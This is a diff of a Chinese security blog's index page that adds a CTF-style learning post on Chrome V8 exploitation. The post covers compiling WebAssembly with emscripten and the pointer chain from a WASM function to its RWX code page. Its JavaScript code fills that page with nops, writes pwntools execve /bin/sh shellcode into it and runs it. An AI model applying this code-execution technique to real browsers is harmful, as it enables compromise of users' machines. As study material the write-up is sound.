@@ -150,6 +150,164 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/12/17/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-3/" class="post-title-link" itemprop="url">chrome v8 pwn 学习 (3)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2024-12-17 16:42:27 / 修改时间：16:42:56" itemprop="dateCreated datePublished" datetime="2024-12-17T16:42:27+08:00">2024-12-17</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/v8%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">v8系列</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>7.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>主要参考blog：<a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/203721.html">传送门</a></p>
+<p>备注：上一篇blog中提到的指针压缩是v8沙箱的重要实现方式，可以避免对象的内存错误溢出到其他重要内存空间。对沙箱的逃逸也是当前漏洞利用的关键，不是那么容易实现的。</p>
+<h1 id="d-utilize-wasm"><a class="markdownIt-Anchor" href="#d-utilize-wasm"></a> D. Utilize WASM</h1>
+<p>在上面的blog中，除了普通的pwn利用方式外，还给出了一种通过WebAssembly进行利用的方式。</p>
+<p>WASM，简单来说，就是将C/C++这种编译语言编译成一种机器码，然后由v8来解释执行它。这个机器码本质上是一种字节码，参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/detectiveHLH/p/9928915.html">资料</a>。我们首先安装一下相关包测试一下它的效果。</p>
+<h2 id="d1-installation-trial"><a class="markdownIt-Anchor" href="#d1-installation-trial"></a> D.1 Installation &amp;&amp; Trial</h2>
+<p>这里选择安装emscripten，这是一个基于LLVM的WASM完整编译链，按照<a target="_blank" rel="noopener" href="https://emscripten.org/docs/getting_started/downloads.html">官方文档</a>中的指引进行安装即可。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Get the emsdk repo</span></span><br><span class="line">git clone https://github.com/emscripten-core/emsdk.git</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enter that directory</span></span><br><span class="line">cd emsdk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Download and install the latest SDK tools.</span></span><br><span class="line">./emsdk install latest</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Make the <span class="string">&quot;latest&quot;</span> SDK <span class="string">&quot;active&quot;</span> <span class="keyword">for</span> the current user. (writes .emscripten file)</span></span><br><span class="line">./emsdk activate latest</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Activate PATH and other environment variables <span class="keyword">in</span> the current terminal</span></span><br><span class="line">source ./emsdk_env.sh</span><br></pre></td></tr></table></figure>
+<p>安装完成后，我们编写一个Demo C程序并用emscripten处理。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用下面的命令编译为WASM：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc demo.c -o demo.js</span><br></pre></td></tr></table></figure>
+<p>它的输出由两个文件组成，一个是JS文件demo.js，另一个是WASM文件demo.wasm。这个demo.js可以通过node直接执行：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node demo.js</span><br></pre></td></tr></table></figure>
+<p>另外还可以创建HTML文件，将上面的编译命令的输出结果后缀替换为html即可，这样可以在浏览器打开html文件时执行WASM。</p>
+<p>我们再安装一个反编译WASM的工具，帮助我们拆解WASM的执行逻辑。这里安装<a target="_blank" rel="noopener" href="https://github.com/WebAssembly/wabt">WABT</a>。按照Github README进行编译安装即可。</p>
+<p>添加了环境变量后，可以使用下面的命令将WASM转换为WAT格式，WAT格式是文本格式，可以理解为WASM的汇编代码。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm2wat demo.wasm &gt; demo.wat</span><br></pre></td></tr></table></figure>
+<p>WABT甚至支持将WASM直接转换为C代码，但最终的效果就像用IDA Pro反汇编出来的C代码一样，可读性有但不多。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wasm2c demo.wasm &gt; demo_rev.c</span><br></pre></td></tr></table></figure>
+<p>需要注意的是，我们并不能直接读取该WASM文件并在d8中直接执行。因为d8中只能执行WASM字节码片段，就像我们在C语言中想要执行一段shellcode一样，这里输出的WASM文件可以对应于完整的ELF文件。将ELF文件从头开始作为shellcode执行当然不可行，因此将WASM文件从头开始在d8中执行同样不可行。那么我们应该对其进行什么处理，才能让d8能够成功执行呢？</p>
+<p>执行下面的命令即可：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc demo.c -o demo.html -s WASM=1 -Os -g2</span><br></pre></td></tr></table></figure>
+<p>这里的<code>-Os</code>表示优化等级，<code>-g2</code>表示调试等级，如果这里不加调试等级，那么导出的符号<code>a</code>、<code>b</code>、<code>c</code>我们可能不方便对应于main，不利于我们后续运行。输出WASM文件用wasm2wat命令解析结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(module $demo.wasm</span><br><span class="line">  (type (;0;) (func (param i32 i32) (result i32)))</span><br><span class="line">  (type (;1;) (func))</span><br><span class="line">  (func $main (type 0) (param i32 i32) (result i32)</span><br><span class="line">    i32.const 42)</span><br><span class="line">  (func $__wasm_call_ctors (type 1))</span><br><span class="line">  (table (;0;) 1 1 funcref)</span><br><span class="line">  (memory (;0;) 258 258)</span><br><span class="line">  (export &quot;a&quot; (memory 0))</span><br><span class="line">  (export &quot;b&quot; (func $__wasm_call_ctors))</span><br><span class="line">  (export &quot;c&quot; (func $main))</span><br><span class="line">  (export &quot;d&quot; (table 0)))</span><br></pre></td></tr></table></figure>
+<p>这里最重要的是需要将输出设置为HTML格式，并设置WASM选项为1。这样会输出一个HTML文件和一个WASM文件，而WASM文件中基本仅会保存main函数的逻辑，且会将main函数作为导出函数，可以在d8中调用。如果使用下面的命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">emcc demo.c -o demo.wasm -Os</span><br></pre></td></tr></table></figure>
+<p>虽然也可以输出WASM文件，但我们无法将其直接加载到d8中进行执行，因为其中包含外部符号（即下面的<code>wasi_snapshot_preview1</code>和<code>proc_exit</code>），而外部符号在d8中是不允许使用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">(module $demo.wasm</span><br><span class="line">  (type (;0;) (func (param i32)))</span><br><span class="line">  (type (;1;) (func))</span><br><span class="line">  (type (;2;) (func (result i32)))</span><br><span class="line">  (import &quot;wasi_snapshot_preview1&quot; &quot;proc_exit&quot; (func $__wasi_proc_exit (type 0)))</span><br><span class="line">  (func $__wasm_call_ctors (type 1)</span><br><span class="line">    nop)</span><br><span class="line">  (func $_start (type 1)</span><br><span class="line">    i32.const 42</span><br><span class="line">    call $__wasi_proc_exit</span><br><span class="line">    unreachable)</span><br><span class="line">  (func $_emscripten_stack_restore (type 0) (param i32)</span><br><span class="line">    local.get 0</span><br><span class="line">    global.set $__stack_pointer)</span><br><span class="line">  (func $emscripten_stack_get_current (type 2) (result i32)</span><br><span class="line">    global.get $__stack_pointer)</span><br><span class="line">  (table (;0;) 2 2 funcref)</span><br><span class="line">  (memory (;0;) 258 258)</span><br><span class="line">  (global $__stack_pointer (mut i32) (i32.const 66560))</span><br><span class="line">  (export &quot;memory&quot; (memory 0))</span><br><span class="line">  (export &quot;__indirect_function_table&quot; (table 0))</span><br><span class="line">  (export &quot;_start&quot; (func $_start))</span><br><span class="line">  (export &quot;_emscripten_stack_restore&quot; (func $_emscripten_stack_restore))</span><br><span class="line">  (export &quot;emscripten_stack_get_current&quot; (func $emscripten_stack_get_current))</span><br><span class="line">  (elem (;0;) (i32.const 1) func $__wasm_call_ctors))</span><br></pre></td></tr></table></figure>
+<p>如果执行包含外部导入符号，d8会产生报错，因此同样的，我们无法在WASM中编写如<code>printf(&quot;Hello world&quot;);</code>这样的语句，因为<code>printf</code>是导入符号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./test_wasm.js:15: TypeError: WebAssembly.Instance(): Import #0 module=&quot;wasi_snapshot_preview1&quot; error: module is not an object or function</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line">                   ^</span><br><span class="line">TypeError: WebAssembly.Instance(): Import #0 module=&quot;wasi_snapshot_preview1&quot; error: module is not an object or function</span><br><span class="line">    at ./test_wasm.js:15:20</span><br></pre></td></tr></table></figure>
+<p>在上面使用正确命令获取的WASM代码中，可以看到<code>main</code>函数是以<code>c</code>作为导出符号的，那么我们需要在d8中调用c这个导出符号：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="title function_">read</span>(<span class="string">&quot;./demo.wasm&quot;</span>), <span class="function"><span class="params">c</span> =&gt;</span> c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">c</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d = <span class="title function_">f</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] return value from wasm: &quot;</span> + d);</span><br></pre></td></tr></table></figure>
+<p>输出结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/Desktop/misc/CTF-problems/2019CTF-masterctf_oob/Chrome » ./v8/v8/out/x64.debug/d8 --allow-natives-syntax ./test_wasm.js</span><br><span class="line">[*] return from wasm: 42</span><br></pre></td></tr></table></figure>
+<p>JS代码的第一行是读取demo.wasm文件并将其转换为8位无符号整数类型。后面则是创建WASM模块于WASM执行实例。通过<code>wasmInstance.exports.xxx</code>获取某个WASM文件导出符号，这里获取的是<code>c</code>，也就是<code>main</code>函数的导出符号，这个导出符号是一个函数，下面可以直接以函数调用的形式执行WASM文件中的<code>main</code>函数，执行的返回值即为<code>main</code>函数的返回值。</p>
+<h2 id="d2-wasm-code-path"><a class="markdownIt-Anchor" href="#d2-wasm-code-path"></a> D.2 WASM Code Path</h2>
+<p>上面我们已经能够成功进行WASM的导入和执行，那么下面我们需要简单理解一下WASM的执行流程。</p>
+<p>考虑下面的代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="title function_">read</span>(<span class="string">&quot;./demo.wasm&quot;</span>), <span class="function"><span class="params">c</span> =&gt;</span> c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">c</span>;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="keyword">var</span> d = <span class="title function_">f</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] return from wasm: &quot;</span> + d);</span><br></pre></td></tr></table></figure>
+<p>WASM文件就使用上面的那个返回42的简单代码。</p>
+<p><img src="1.png" alt="" /></p>
+<p>在断点处查看内存布局，可以发现一个RWX权限的页，</p>
+<p><img src="2.png" alt="" /></p>
+<p>经过简单查找之后，我们就可以发现WASM代码转换得到的x64汇编代码。可见在我们能够进行任意地址读写后，可以通过修改这里直接执行shellcode。</p>
+<p>那么，我们应该通过什么地址链找到这里呢。本文的主要blog提供了一条链子：</p>
+<h3 id="a-functionshared_info-offset-0x18"><a class="markdownIt-Anchor" href="#a-functionshared_info-offset-0x18"></a> A. Function.shared_info (offset 0x18)</h3>
+<p>这里的Function就是上面脚本中的f。</p>
+<p><img src="3.png" alt="" /></p>
+<h3 id="b-sharedfunctioninfodata-offset-8"><a class="markdownIt-Anchor" href="#b-sharedfunctioninfodata-offset-8"></a> B. SharedFunctionInfo.data (offset 8)</h3>
+<p><img src="4.png" alt="" /></p>
+<h3 id="c-wasmexportedfunctiondatainstance-offset-0x10"><a class="markdownIt-Anchor" href="#c-wasmexportedfunctiondatainstance-offset-0x10"></a> C. WasmExportedFunctionData.instance (offset 0x10)</h3>
+<p><img src="5.png" alt="" /></p>
+<h3 id="d-wasminstanceobject-0x88"><a class="markdownIt-Anchor" href="#d-wasminstanceobject-0x88"></a> D. WasmInstanceObject + 0x88</h3>
+<p><img src="6.png" alt="" /></p>
+<p>这样我们就可以找到RWX的内存页的首地址。实际上我们找到这里就可以了，不用管页内偏移具体是多少，因为我们可以直接用nop指令填充该页的绝大部分，然后在后面附加shellcode即可。</p>
+<h2 id="d3-chrome-v8-double-kill"><a class="markdownIt-Anchor" href="#d3-chrome-v8-double-kill"></a> D.3 Chrome v8 Double Kill</h2>
+<p>我们尝试将寻找RWX页的内存地址的实现代码添加到上一篇blog中实现的exp脚本后面：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- Load WASM code</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="title function_">read</span>(<span class="string">&quot;./demo.wasm&quot;</span>), <span class="function"><span class="params">c</span> =&gt;</span> c.<span class="title function_">charCodeAt</span>(<span class="number">0</span>)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">c</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- Get RWX page start</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f_addr = <span class="title function_">get_object_address</span>(f);</span><br><span class="line"><span class="keyword">var</span> shared_function_info_addr = <span class="title function_">read_at</span>(f_addr + <span class="number">0x18n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_function_data_addr = <span class="title function_">read_at</span>(shared_function_info_addr + <span class="number">0x8n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_object_addr = <span class="title function_">read_at</span>(wasm_exported_function_data_addr + <span class="number">0x10n</span>) - <span class="number">1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_start = <span class="title function_">read_at</span>(wasm_instance_object_addr + <span class="number">0x88n</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Got RWX page start: 0x&quot;</span> + rwx_page_start.<span class="title function_">toString</span>(<span class="number">16</span>));</span><br></pre></td></tr></table></figure>
+<p>然后加上nop指令填充：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- Fill most of the page with nop instructions</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> off=<span class="number">0</span>; off &lt;= <span class="number">0xEF8</span>; off++) &#123;</span><br><span class="line">    <span class="title function_">write_at</span>(rwx_page_start + <span class="title class_">BigInt</span>(off), <span class="number">0x9090909090909090n</span>);    <span class="comment">// nop: 0x90</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>编写下面的简单Python脚本获取shellcode字节序列：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">asm_bytes = asm(shellcraft.amd64.sh())</span><br><span class="line"></span><br><span class="line">asm_list = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> b <span class="keyword">in</span> asm_bytes:</span><br><span class="line">    asm_list.append(b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(asm_list)</span><br></pre></td></tr></table></figure>
+<p>字节序列为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5]</span><br></pre></td></tr></table></figure>
+<p>将shellcode写入RWX页中：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// -----------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ---- Write shellcode and execute &quot;WASM code&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">106</span>, <span class="number">104</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">98</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">47</span>, <span class="number">115</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">write_at</span>(rwx_page_start + <span class="number">0xf00n</span> + <span class="title class_">BigInt</span>(i), <span class="title class_">BigInt</span>(shellcode[i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Ready to execute shellcode!&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> d = <span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>
+<p><img src="7.png" alt="" /></p>
+<p>攻击成功。</p>
+<p>完整JS代码：<a href="exp.js">exp.js</a></p>
+<h1 id="e-阶段总结"><a class="markdownIt-Anchor" href="#e-阶段总结"></a> E. 阶段总结</h1>
+<p>在前面3篇blog中，我们讨论了不加沙箱的Chrome v8的相关漏洞利用策略，总的来说，Chrome v8的漏洞利用路线是非常固定的，基本都是从类型混淆开始，到可以获得对象地址以及将一个地址作为对象，再到任意地址读写，最后各显神通。</p>
+<p>在后面的学习中，我们就需要应对带有沙箱的更新的版本的Chrome v8，浅看了一些blog，发现利用的路径应该也比较固定。一路走来，从Javascript的解析再到WASM，可以发现Chrome v8集成了很多的功能，值得我们深入探索。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/12/10/chrome-v8-pwn-%E5%AD%A6%E4%B9%A0-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1416,7 +1574,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-07-10 20:45:09" itemprop="dateModified" datetime="2024-07-10T20:45:09+08:00">2024-07-10</time>
+                <time title="修改时间：2024-12-12 22:35:12" itemprop="dateModified" datetime="2024-12-12T22:35:12+08:00">2024-12-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1568,188 +1726,7 @@
 <p>在CodeQL中，可以使用<code>signature</code>关键字定义一个模块签名，可以看做是一个模块接口，其他模块可以通过使用<code>implements</code>接口实现该模块。一旦要实现某个模块，必须在该模块中实现模块签名中除使用<code>default</code>修饰的所有内容，包括数据类型、类、谓词等。</p>
 <h3 id="example-12"><a class="markdownIt-Anchor" href="#example-12"></a> Example 12</h3>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import MyModule</span><br><span class="line"></span><br><span class="line">signature module MyModuleTemplate&#123;</span><br><span class="line">    predicate enough_string_length(Literal literal);</span><br><span class="line">    default string description() &#123; result = &quot;Default description&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module MyModule implements MyModuleTemplate &#123;</span><br><span class="line">    predicate enough_string_length(Literal literal) &#123;</span><br><span class="line">        literal.toString().length() &gt; 3</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Literal literal</span><br><span class="line">where MyModule::enough_string_length(literal)</span><br><span class="line">select literal, MyModule::description()</span><br></pre></td></tr></table></figure>
-<p>在上例中，我们定义了一个模块签名<code>MyModuleTemplate</code>，其中定义了一个谓词，在模块签名中的谓词不需要使用<code>signature</code>，会默认将其看做谓词签名。下面还定义了一个<code>default</code>修饰的谓词，这个谓词可以选择不实现，这样实例化模块中会直接�</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">CVE-2024-6387 分析</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
